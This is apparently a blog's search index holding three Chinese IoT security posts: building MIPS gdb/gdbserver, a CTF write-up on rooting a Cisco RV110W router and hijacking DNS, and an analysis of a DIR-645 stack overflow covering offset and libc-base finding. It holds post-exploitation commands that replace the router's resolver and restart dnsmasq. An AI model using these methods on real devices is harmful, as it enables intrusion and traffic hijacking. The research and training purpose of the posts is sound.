<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>交叉编译mips架构gdb+gdbServer</title>
    <url>/2020/10/06/jiao-cha-bian-yi-mips-jia-gou-gdb-gdbserver/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>GDB + IDA + burp是吃饭三件套，一个能使用的gdb和gdbserver是调试IoT设备二进制漏洞的必备条件，之前都是从github下载他人编译好的，一旦他人gdb和gdbserver用不了的话，直接歇菜！</p>
<h1 id="相关工具"><a href="#相关工具" class="headerlink" title="相关工具"></a>相关工具</h1><p>这里的工具选择并不要求完全一样，我只是在这个环境第一次成功，然后直接记录下来了。</p>
<ul>
<li>ubuntu：14.04和16.04都可以的。</li>
<li>buildroot：<a href="http://buildroot.net/downloads/" target="_blank" rel="noopener">源码下载</a>选择的是buildroot2015.02，其中包含的kernel版本以及gcc版本比较老。</li>
<li>gdb：<a href="https://ftp.gnu.org/gnu/gdb/" target="_blank" rel="noopener">源码下载</a>选择gdb-6.8a.tar.gz和gdb-7.12.tar.gz。</li>
</ul>
<p>buildroot是为了生成交叉编译工具链，之后交叉编译gdb。</p>
<h1 id="相关步骤"><a href="#相关步骤" class="headerlink" title="相关步骤"></a>相关步骤</h1><h2 id="buildroot"><a href="#buildroot" class="headerlink" title="buildroot"></a>buildroot</h2><ul>
<li>Target options：MIPS小端，ELF，mips 32</li>
</ul>
<p><img src="image-20201006102450354.png" alt=""></p>
<ul>
<li>Toolchain：Kernel Headers version选择2.6.32，C library选择uClibc，GCC编译器版本选择gcc 4.5.x</li>
</ul>
<p><img src="image-20201006102953867.png" alt=""></p>
<ul>
<li><p>make，接下来等就完事了，时间看网速，很多东西有梯子下载会快些。完成之后需要的gcc会在bulidroot的output目录下。</p>
<p><img src="image-20201006103545302.png" alt=""></p>
</li>
<li><p>可以添加环境变量</p>
<p>在/etc/profile或者<del>/.bashrc或者</del>/.zshrc中添加</p>
<p>export PATH=$PATH:xxx/buildroot-2015.02/output/host/bin</p>
<p>之后source /etc/profile</p>
<p><img src="image-20201006104216657.png" alt=""></p>
</li>
</ul>
<h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><pre class=" language-sh"><code class="language-sh">cd gdb-6.8
CC="xxx/project/buildroot-2015.02/output/host/usr/bin/mipsel-linux-gcc    "
./configure --target=mipsel-linux --host=mipsel-linux  CFLAGS='-static'
make</code></pre>
<p>遇到的问题：</p>
<ul>
<li><p>./readline/support/wcwidth.c</p>
<p>错误如下：</p>
<pre class=" language-sh"><code class="language-sh">mipsel-linux-gcc -DHAVE_CONFIG_H -DCROSS_COMPILING   -I. -I.././readline -DRL_LIBRARY_VERSION='"5.1"' -static -c .././readline/support/wcwidth.c
.././readline/support/wcwidth.c:17:29: 错误：expected ‘)’ before ‘ucs’
.././readline/support/wcwidth.c:67:21: 错误：expected ‘)’ before ‘ucs’
.././readline/support/wcwidth.c:134:28: 错误：expected ‘;’, ‘,’ or ‘)’ before ‘*’ token
.././readline/support/wcwidth.c:156:32: 错误：expected ‘)’ before ‘ucs’
.././readline/support/wcwidth.c:225:32: 错误：expected ‘;’, ‘,’ or ‘)’ before ‘*’ token
Makefile:166: recipe for target 'wcwidth.o' failed</code></pre>
<p>解决办法：</p>
<p>在gdb根目录下的readline/support/wcwidth.c添加<strong>#include &lt;stddef.h&gt;</strong></p>
</li>
<li><p><strong>configure: error: no termcap library found</strong></p>
<ol>
<li><p><a href="https://ftp.gnu.org/gnu/termcap/下载termcap-1.3.1.tar.gz" target="_blank" rel="noopener">https://ftp.gnu.org/gnu/termcap/下载termcap-1.3.1.tar.gz</a></p>
</li>
<li><p>tar解压</p>
</li>
<li><p>./configure</p>
</li>
<li><p>在termcap-1.3.1根目录下的Makefile文件中修改CC AR RANLIB为：</p>
<pre class=" language-sh"><code class="language-sh">CC = xxx/project/buildroot-2015.02/output/host/usr/bin/mipsel-linux-gcc
AR = xxx/project/buildroot-2015.02/output/host/usr/bin/mipsel-linux-ar
RANLIB = xxx/project/buildroot-2015.02/output/host/usr/bin/mipsel-linux-ranlib</code></pre>
</li>
<li><p>make，生成的libtermcap.a文件，将其拷贝到交叉编译工具链的lib文件夹。</p>
<pre class=" language-sh"><code class="language-sh">~ mipsel-linux-gcc -print-file-name=libc.a
xxx/project/buildroot-2015.02/output/host/usr/mipsel-buildroot-linux-uclibc/sysroot/usr/lib/libc.a
~ cp libtermcap.a xxx/project/buildroot-2015.02/output/host/usr/mipsel-buildroot-linux-uclibc/sysroot/usr/lib/</code></pre>
</li>
</ol>
</li>
<li><p>./gdb/Makefile</p>
<pre class=" language-sh"><code class="language-sh">cc1: warnings being treated as errors
cp-name-parser.y: 在函数‘cp_comp_to_string’中:
cp-name-parser.y:1980:20: 错误：在‘enum demangle_component_type’和‘enum <匿名>’间比较
cp-name-parser.y:1985:25: 错误：在‘enum demangle_component_type’和‘enum <匿名>’间比较
Makefile:1110: recipe for target 'cp-name-parser.o' failed
make[2]: *** [cp-name-parser.o] Error 1
make[2]: Leaving directory 'xxx/project/gdb-6.8/gdb'
Makefile:10191: recipe for target 'all-gdb' failed
make[1]: *** [all-gdb] Error 2
make[1]: Leaving directory 'xxx/project/gdb-6.8'
Makefile:701: recipe for target 'all' failed</code></pre>
<p>根据报错知道问题出现在gdb根目录下的gdb文件夹中，打开其中Makefile文件</p>
<p>定位Werror，删除WERROR_CFLAGS = 之后的<strong>-Werror</strong></p>
<p><img src="image-20201009101053561.png" alt=""></p>
</li>
</ul>
<p>之后会在/gdb-6.8/gdb和/gdb6.8/gdb/gdbserver下生成gdb和gdbserver</p>
<pre class=" language-sh"><code class="language-sh">~ file gdb
gdb: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped
~ file gdbserver/gdbserver
gdbserver/gdbserver: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, not stripped</code></pre>
<p>可以去掉符号表</p>
<pre class=" language-sh"><code class="language-sh">mipsel-linux-strip gdb
mipsel-linux-strip gdbserver/gdbserver</code></pre>
]]></content>
      <categories>
        <category>crosscompiling</category>
      </categories>
  </entry>
  <entry>
    <title>2020强网杯决赛Cisco路由器</title>
    <url>/2020/09/18/2020-qiang-wang-bei-jue-sai-cisco-lu-you-qi/</url>
    <content><![CDATA[<h1 id="题目相关"><a href="#题目相关" class="headerlink" title="题目相关"></a>题目相关</h1><p><strong>题目描述：</strong>挖掘并利用CISCO RV110W-E-CN-K9（固件版本1.2.2.5）中的漏洞，获取路由器的Root Shell，实现DNS劫持。</p>
<p><strong>靶机环境：</strong>CISCO RV110W-E-CN-K9（固件版本1.2.2.5），设置后台管理密码、WIFI密码，默认关闭telnet。</p>
<p><strong>附件信息：</strong>附件中提供了路由器固件（固件版本1.2.2.5，与靶机版本一致），路由器设备后台管理账号为cisco，密码为qwb2020 ，WiFi密码未设置。</p>
<p><strong>展示环境拓扑：</strong>展台路由器WAN口连接互联网，选手攻击机和操作员验证机通过网线连接路由器LAN口，IP地址设置自动获取。</p>
<p><strong>展示目标：</strong>选手携带自己的攻击机上台，通过有线方式连接路由器设备。在规定的时间内攻击展台路由器，获取路由器的Root Shell执行系统命令，劫持<a href="http://www.baidu.com为如下页面：">http://www.baidu.com为如下页面：</a></p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">100</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hacked by BOI<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
<p>操作人员使用验证机中的Firefox浏览器访问<a href="http://www.baidu.com查看攻击效果，确认实现DNS劫持后判定成功。" target="_blank" rel="noopener">http://www.baidu.com查看攻击效果，确认实现DNS劫持后判定成功。</a></p>
<p><strong>注意事项：</strong>上台展示题解的时候注意关闭exp的调试信息。</p>
<p><strong>展示时操作人员操作步骤：</strong></p>
<p>1）  重启路由器设备；</p>
<p>2）  将互联网网线连接路由器WAN口；</p>
<p>3）  验证机通过有线方式连接路由器设备LAN口；</p>
<p>4）  设置验证机的DNS服务器IP地址为路由器IP；</p>
<p>5）  清除浏览器历史记录，清除本机的DNS缓存；</p>
<p>6）  等待选手连接路由器；</p>
<p>7）  等待选手攻击；</p>
<p>8）  在规定时间内可以配合选手重启路由器设备（每次重启首先要重复步骤4，5）；</p>
<p>9）  选手攻击完毕后，操作人员使用验证机中的浏览器访问网页验证效果；</p>
<p>10）      攻击成功或超时后：关闭路由器。</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>根据题目要求，攻击机通过lan口连接，并没有提供用户名密码，登录不了管理界面，所以需要做到三点：前台身份验证绕过，后台命令执行或代码执行，DNS劫持。也可以改成两点：未授权命令执行或未授权代码执行，DNS劫持。</p>
<h2 id="现有的？"><a href="#现有的？" class="headerlink" title="现有的？"></a>现有的？</h2><p>先找找有无公布exp的前台代码执行和命令执行的CVE，<a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CISCO%20RV110W" target="_blank" rel="noopener">链接</a></p>
<p><strong>CVE-2019-1663（未授权，远程代码执行）</strong>&lt; 1.2.2.1</p>
<p><strong>CVE-2020-3323</strong> <strong>(RCE，远程命令执行)</strong>  &lt; 1.2.2.8</p>
<p><strong>CVE-2020-3331</strong> <strong>(RCE，任意代码执行)</strong>  &lt; 1.2.2.8</p>
<p><strong>CVE-2020-3330（默认系统用户凭证）</strong> &lt; 1.2.2.8</p>
<p><strong>CVE-2020-3144 (身份验证绕过,命令执行)</strong>  &lt; 1.2.2.8</p>
<p>只有CVE-2019-1663有exp，而且msf集成了该漏洞利用模块，直接用msf测试一波发现无法使用了，说明1.2.2.5版本补了这个漏洞。其他的CVE是2020年7月份Cisco刚公布的严重漏洞，网上还没有利用代码。</p>
<p>其实想想也可以知道，出题的师傅肯定做了充分的调研，不可能让大家这么简单找到exp直接使用的。</p>
<h2 id="手工挖0day？"><a href="#手工挖0day？" class="headerlink" title="手工挖0day？"></a>手工挖0day？</h2><p>主办方提供了螺丝刀套装、焊台、万用表、TTL小板和飞线，很明显就是让你拆机了。</p>
<p>没有能直接使用的未授权RCE，那就只能<strong>代码审计</strong>和<strong>补丁比对</strong>找0day了，代码审计也不是盲目的代码审计。结合补丁比对能够迅速定位厂商修补了哪些未公开的代码。</p>
<p>CVE-2019-1663的漏洞点是login.cgi的strcpy函数。GDB+IDA+burp吃饭三件套复现该漏洞，这里不详细描述啦！</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>主要的思路是定位危险函数：system()、Popen()、strcpy()、strcat()、sprintf()等。</p>
<h4 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h4><p>命令注入漏洞是优先考虑的漏洞，这种漏洞在路由器等嵌入式设备中出现的可能性很高。</p>
<ol>
<li>这些设备在配置和使用过程中与底层硬件的交互非常多，开发者为了方便通常直接使用system函数来执行配置命令。常见的命令注入点主要有：<strong>诊断页面中的ping输入框</strong>，开发者经常未对用户输入进行过滤，直接传递给system函数或popen函数，进而导致命令注入。</li>
<li>命令注入漏洞相较于缓冲区溢出漏洞而言，调试起来更简单，使用<strong>burpsuite</strong>进行调试即可。</li>
<li>很多命令注入漏洞无需认证，能够直接达到RCE的效果。</li>
</ol>
<h4 id="缓冲区溢出漏洞"><a href="#缓冲区溢出漏洞" class="headerlink" title="缓冲区溢出漏洞"></a>缓冲区溢出漏洞</h4><p>主要是栈溢出，栈溢出漏洞在路由器等小型嵌入式IoT设备中的占比尤其高，主要是因为开发者直接使用危险函数处理用户输入，导致攻击者能够覆盖返回地址，劫持程序控制流，达到任意代码执行的目的。</p>
<ol>
<li>定位strcpy()等危险函数。</li>
<li>判断输入对应的cgi时候是否有相应的URI，这样就能利用Burp构造相应数据包进行测试，进而了解如何触发该漏洞。</li>
<li>判断输入点距离ra的偏移量，一般情况下能够在IDA看出来，实在判断不了，只能通过上传相应的gdb，进行调试，同时判断出libc的基地址。</li>
<li>最后构造完整的rop链进行不断测试。</li>
</ol>
<h3 id="补丁比对"><a href="#补丁比对" class="headerlink" title="补丁比对"></a>补丁比对</h3><p>通过比对最新版本1.2.2.8与当前版本1.2.2.5版本能够发现厂商自行修补但未公布的漏洞。</p>
<p>这里主要使用bindiff工具，结合IDA pro进行补丁比对。找到其中相同函数名，但是相似度不高的函数进行分析。</p>
<p>本次的漏洞点是通过补丁比对找到的，能够清楚的找到在最新版本修复掉的危险函数。</p>
<h1 id="劫持DNS"><a href="#劫持DNS" class="headerlink" title="劫持DNS"></a>劫持DNS</h1><p>在成功getshell之后，考虑如何劫持DNS，这里的方法有很多。</p>
<p>大体步骤是：</p>
<ol>
<li><p>利用bind等类型软件搭建DNS服务器，并提供公网地址IP。</p>
</li>
<li><p>配置DNS服务器，将所有解析域名为<a href="http://www.baidu.com的请求，劫持为下列页面。" target="_blank" rel="noopener">www.baidu.com的请求，劫持为下列页面。</a></p>
<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">100</span>px<span class="token punctuation">;</span><span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hacked by BOI<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
</li>
<li><p>getshell后，执行下列命令：</p>
<pre class=" language-sh"><code class="language-sh">echo "nameserver 搭建的DNS服务器公网IP" > /tmp/resolv.conf;
killall dnsmasq;
/usr/sbin/dnsmasq -C /tmp/dnsmasq.conf -r /tmp/resolv.conf</code></pre>
</li>
</ol>
<p>之后让工作人员的验证机通过lan口连接路由器， 设置验证机的DNS服务器IP地址为路由器IP，清除浏览器历史记录，清除本机的DNS缓存，使用Firefox浏览器访问<a href="http://www.baidu.com。" target="_blank" rel="noopener">www.baidu.com。</a></p>
]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>cisco</tag>
        <tag>RV110W(1.2.2.5)</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR645缓冲区溢出分析</title>
    <url>/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/20171003235219534" alt=""></p>
<p>公告显示3个缓冲区溢出漏洞，下面一个个分析。</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</a></li>
</ul>
<h1 id="Buffer-overflow-on-“post-login-xml”"><a href="#Buffer-overflow-on-“post-login-xml”" class="headerlink" title="Buffer overflow on “post_login.xml”"></a>Buffer overflow on “post_login.xml”</h1><h2 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<p>Buffer overflow on “post_login. xml”<br>Invoking the “post_login. xml”server-side script, attackers can specify a “hash”password value that is used to authenticate the user. This hash value is eventually processed by the “/usr/sbin/widget”local binary. However, the latter copies the user-controlled hash into a statically-allocated buffer, allowing attackers to overwrite ad jacent memory locations.</p>
</blockquote>
<p>漏洞公告：攻击者调用<code>post_login.xml</code>服务端脚本时，可以指定用于验证用户身份的hash值，这个hash值最终被<code>/usr/sbin/widget</code>程序处理，该程序会将程序控制的hash值复制到静态分配的缓冲区中，从而覆盖相邻的内存地址。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>根据公告可知：需要分析<code>post_login.xml</code>和<code>/usr/sbin/widget</code>这两个文件，以及它们如何处理用户输入的hash。</p>
<p><code>find . -name "post_login.xml"</code>，文件在<code>/htdocs/web/post_login.xml</code>。</p>
<p>该xml文件是为了支持widget登录检测。代码意思是：接收GET请求传递的hash值并写入<code>/var/run/hash</code>文件，获取password写入<code>/var/run/password</code>，通过<code>/runtime/widgetv2/logincheck</code>判断login是否正确。</p>
<pre class=" language-xml"><code class="language-xml">#/htdocs/web/post_login.xml

HTTP/1.1 200 OK
Content-Type: text/xml

<span class="token prolog">&lt;?
/*
* Created by Kwest Wan 20071012
* to support D-Link widget login check
*/
$hash = $_GET["hash"];
$xml_head = fread("", "/htdocs/web/__login_head.xml");
$file = "/var/run/password";
$password = query("/device/account/entry:1/password");
fwrite("w", $file, $password);
fwrite("w", "/var/run/hash", $hash);
$logined = "error";
$logined = query("/runtime/widgetv2/logincheck");

if($logined == "OK")
{
    $response = "OK"; 
}
else
{
    $response = "error";
}

echo $xml_head."&lt;login>".$response."&lt;/login>";
?></span></code></pre>
<p>解压出来的文件系统中找不到<code>/runtime/widgetv2/logincheck</code>，应该是运行过程中产生的文件，根据公告提示与此关联的二进制文件是<code>usr/bin/widget</code>，能够利用qemu用户模式模拟执行了解其功能：-s 生成salt，-a 生成登录hash的密码文件。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606082601324.png" alt=""></p>
<p>直接利用Ghidra打开<code>usr/bin/widget</code>进行分析。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606082135298.png" alt=""></p>
<p>直接进入main函数，遇到getopt函数，该函数的定义和作用可以参考<a href="https://www.cnblogs.com/chenliyang/p/6633739.html" target="_blank" rel="noopener">文章</a>为：</p>
<pre class=" language-txt"><code class="language-txt">1.定义：
int getopt(int argc, char * const argv[], const char *optstring);
2.参数：
argc：main()函数传递过来的参数的个数
argv：main()函数传递过来的参数的字符串指针数组
optstring：选项字符串，告知 getopt()可以处理哪个选项以及哪个选项需要参数
3.返回：
如果选项成功找到，返回选项字母；如果所有命令行选项都解析完毕，返回 -1；如果遇到选项字符不在 optstring 中，返回字符 '?'；如果遇到丢失参数，那么返回值依赖于 optstring 中第一个字符，如果第一个字符是 ':' 则返回':'，否则返回'?'并提示出错误信息。
4.举例说明选项字符串optstring的意义：
char*optstring = “ab:c::”;
单个字符a         表示选项a没有参数            格式：-a即可，不加参数
单字符加冒号b:     表示选项b有且必须加参数      格式：-b 100或-b100,但-b=100错
单字符加2冒号c::   表示选项c可以有，也可以无     格式：-c200，其它格式错误

optarg —— 指向当前选项参数(如果有)的指针。
optind —— 再次调用 getopt() 时的下一个 argv指针的索引。
optopt —— 最后一个未知选项。
opterr —— 如果不希望getopt()打印出错信息，则只要将全域变量opterr设为0即可。</code></pre>
<p>继续分析，getopt()获取了命令行参数，会进行判断，如果是-a选项，则会一直往下运行至<code>FUN_004009f0("/var/run/hash",&amp;local_128);</code></p>
<pre class=" language-txt"><code class="language-txt">iVar4 = getopt(param_1,param_2,"a:shv"), 0 < iVar4
if (iVar4 == 0x61) {//判断选项字符是否是'a'
    iVar6 = 1;
    uVar7 = optarg;
}
...
memset(&local_128,0,0x100);
FUN_004009f0("/var/run/hash",&local_128);
memset(&local_380,0,0x40);
local_37c = local_124;
local_380 = local_128;
memset(auStack832,0,0x40);
FUN_004009f0(uVar7,auStack832);</code></pre>
<p>进入FUN_004009f0(“/var/run/hash”,&amp;local_128)。两个参数分别是<code>/var/run/hash</code>和栈上的地址<code>local_128</code>缓冲区大小为0x100。</p>
<pre class=" language-c"><code class="language-c">undefined4 <span class="token function">FUN_004009f0</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>param_1<span class="token punctuation">,</span><span class="token keyword">void</span> <span class="token operator">*</span>param_2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> __fd<span class="token punctuation">;</span>
  size_t sVar1<span class="token punctuation">;</span>
  stat sStack168<span class="token punctuation">;</span>

  __fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>param_1<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>__fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Can\'t open file %s.\n"</span><span class="token punctuation">,</span>param_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">fstat</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span><span class="token operator">&amp;</span>sStack168<span class="token punctuation">)</span><span class="token punctuation">;</span>
    sVar1 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>__fd<span class="token punctuation">,</span>param_2<span class="token punctuation">,</span>sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>sVar1 <span class="token operator">==</span> sStack168<span class="token punctuation">.</span>st_blocks<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"read error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">close</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
    __fd <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
                    <span class="token comment" spellcheck="true">/* WARNING: Subroutine does not return */</span>
  <span class="token function">exit</span><span class="token punctuation">(</span>__fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>先打开了<code>/var/run/hash</code>，然后利用fstat将打开的文件状态存入sStack168，之后将文件中的内容读取到第二个参数<code>local_128</code>中，而之前在分析<code>post_login.xml</code>的时候知道，我们通过get方式传入的hash值被写进了<code>/var/run/hash</code>。而且没有对hash值做长度限制就直接拷贝到栈上，这就导致了栈溢出。</p>
<p>程序往下执行会再一次调用FUN_004009f0()，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606111858498.png" alt=""></p>
<p>这里的第一个uVar7是命令-a 的参数：生成登录hash的密码文件。这可以是我们输入的文件名，但是需要里面有内容，这样open不会报错。根据<code>post_login.xml</code>可知真实环境中应该是/var/run/password。手上没有真实机器所以就随便创建一个文件。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606112103650.png" alt=""></p>
<p>因为真实环境中我们能控制的只有/var/run/hash。所以溢出点是调用FUN_004009f0(“/var/run/hash”,&amp;local_128)。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>整个漏洞利用过程是</p>
<ul>
<li>劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移</li>
<li>确定攻击路径，构造ROP链</li>
<li>编写exp,getshell</li>
</ul>
<h3 id="劫持PC，确定偏移"><a href="#劫持PC，确定偏移" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>测试脚本run.sh，因为解压的固件中没有/var/run文件夹所以需要手工创建，print函数默认在每行结尾加上换行，利用tr -d ‘\n’删除换行。经过尝试从context中读取400个字节不会报错。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu -g 23957 /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh </code></pre>
<p>使用IDA或者gdb-multiarch联调运行到main()返回时ra寄存器中的值为0x6A41376A。</p>
<p><code>./patternLocOffset.py -s 0x6A41376A -l 2000</code>确定偏移为292。</p>
<p>因为程序结构比较简单，函数嵌套不多，也可以通过ghidra或者IDA手工计算偏移：read的第二个参数是<code>$sp, 0x3A8+var_128</code>，而ra的值通过<code>sw      $ra, 0x3A8+var_4($sp)</code>存储在0x3A8+var_4($sp)，两者相差0x128-0x4=292。</p>
<p>在覆盖返回地址的时候，因为FUN_004009f0()是非叶子函数，该函数的ra也会保存在栈中，所以能否通过覆盖当前函数FUN_004009f0()的返回地址来劫持PC呢？</p>
<p>从下图可以看出，进入函数后，程序先是<code>addiu   $sp, -0xC0</code>新开辟了0xc0大小的栈空间，然后将ra存储在<code>0xC0+var_4($sp)</code>的地方。而read的第二个参数存储的偏移应该是0x3a8-0x128+0x4=644，但是参数的位置比当前函数ra位置高，而在填充栈的时候是往高地址填充，不可能会覆盖到低地址的ra。因此只能覆盖main函数的ra来劫持PC。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606233414737.png" alt=""></p>
<h3 id="选择攻击路径构造ROP链"><a href="#选择攻击路径构造ROP链" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>因为在ubuntu16.04上构造的exp打不通，换了kali虚拟机进行调试，先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch usr/sbin/widget
set architecture mips
target remote :23957
b *0x00400E74  #main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc是libuClibc-0.9.30.1.so基地址为0x7f738000。</p>
<pre class=" language-sh"><code class="language-sh">pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
......
0x7f738000 0x7f739000 rwxp     1000 0      /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x7f739000 0x7f796000 r-xp    5d000 1000   /root/桌面/IoT/D-Link/DIR645/dir645-v103/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
<p>在main()函数返回时能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样的。具体可以参考<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">之前的文章</a>。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200606235811264.png" alt=""></p>
